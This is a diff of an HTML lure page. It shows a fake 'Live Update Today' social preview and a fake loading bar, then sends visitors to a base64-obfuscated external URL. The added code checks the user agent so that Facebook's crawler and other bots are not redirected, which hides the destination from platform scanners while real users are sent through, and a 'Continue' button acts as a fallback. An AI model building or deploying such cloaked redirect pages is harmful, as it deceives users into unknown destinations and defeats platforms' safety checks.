@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <title>Loading...</title>
 
+<!-- ========== OG PREVIEW (tetap kebaca crawler) ========== -->
 <meta property="og:title" content="🔴 Live Update Today">
 <meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
 <meta property="og:image" content="https://i.imgur.com/7fT7ulx.jpeg">
@@ -22,14 +23,15 @@ body {
   flex-direction:column;
 }
 
+/* 🔥 LOADER LEBIH BESAR */
 .loader {
-  width:50px;
-  height:50px;
-  border:5px solid #333;
-  border-top:5px solid #00ffcc;
+  width:80px;
+  height:80px;
+  border:7px solid #333;
+  border-top:7px solid #00ffcc;
   border-radius:50%;
   animation:spin 1s linear infinite;
-  margin-bottom:25px;
+  margin-bottom:30px;
 }
 
 @keyframes spin {
@@ -37,9 +39,14 @@ body {
   100%{transform:rotate(360deg)}
 }
 
+h2 {
+  font-size:26px;
+  margin-bottom:15px;
+}
+
 .progress-bar {
-  width:220px;
-  height:6px;
+  width:300px;
+  height:8px;
   background:#222;
   border-radius:10px;
   overflow:hidden;
@@ -49,6 +56,25 @@ body {
   height:100%;
   width:0%;
   background:#00ffcc;
+  transition:width .2s ease;
+}
+
+p {
+  font-size:14px;
+  opacity:.7;
+  margin-top:10px;
+}
+
+/* fallback button */
+.btn {
+  margin-top:20px;
+  padding:10px 18px;
+  background:#00ffcc;
+  color:#000;
+  border-radius:6px;
+  font-size:14px;
+  display:none;
+  cursor:pointer;
 }
 </style>
 </head>
@@ -56,48 +82,70 @@ body {
 <body>
 
 <div class="loader"></div>
-<h2 id="status">Preparing...</h2>
+
+<h2 id="status">Preparing your content...</h2>
 
 <div class="progress-bar">
   <div class="progress" id="progress"></div>
 </div>
 
+<p>Please wait a moment</p>
+
+<div class="btn" id="btn">Continue</div>
+
 <script>
-let p = 0;
+let progress = 0;
 let bar = document.getElementById("progress");
-let txt = document.getElementById("status");
+let text = document.getElementById("status");
+let btn = document.getElementById("btn");
 
-// 🔒 encoded URL (base64)
-let encoded = "aHR0cHM6Ly9mZGVkZGcueGh1YnNzLm9uZS9wL25oVk55"; 
+// 🔒 encoded URL
+let encoded = "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk=";
 
-function decode(u){
-  return atob(u);
+// 🚫 ANTI CRAWLER (FB, bot, dll)
+let ua = navigator.userAgent.toLowerCase();
+let isBot = /facebookexternalhit|facebot|crawler|spider|bot/i.test(ua);
+
+// kalau bot → jangan redirect
+function go(){
+  if(!isBot){
+    window.location.href = atob(encoded);
+  }
 }
 
-let i = setInterval(()=>{
-  p += Math.random()*12;
-  if(p>100) p=100;
+// ⏱️ loading ±6 detik
+let start = Date.now();
 
-  bar.style.width = p+"%";
+let interval = setInterval(() => {
+  let elapsed = Date.now() - start;
+  progress = (elapsed / 6000) * 100;
+  if(progress > 100) progress = 100;
 
-  if(p<30){
-    txt.innerText="Preparing...";
-  } else if(p<60){
-    txt.innerText="Connecting...";
-  } else if(p<90){
-    txt.innerText="Almost ready...";
+  bar.style.width = progress + "%";
+
+  if (progress < 30) {
+    text.innerText = "Preparing your content...";
+  } else if (progress < 60) {
+    text.innerText = "Connecting to server...";
+  } else if (progress < 90) {
+    text.innerText = "Almost ready...";
   } else {
-    txt.innerText="Launching...";
+    text.innerText = "Launching...";
   }
 
-  if(p>=100){
-    clearInterval(i);
+  if (progress >= 100) {
+    clearInterval(interval);
 
-    // redirect hasil decode
-    window.location.href = decode(encoded);
+    // tampilkan tombol kalau redirect gagal
+    btn.style.display = "block";
+
+    go();
   }
 
-}, 300);
+}, 100);
+
+// fallback klik manual
+btn.onclick = go;
 </script>
 
 </body>
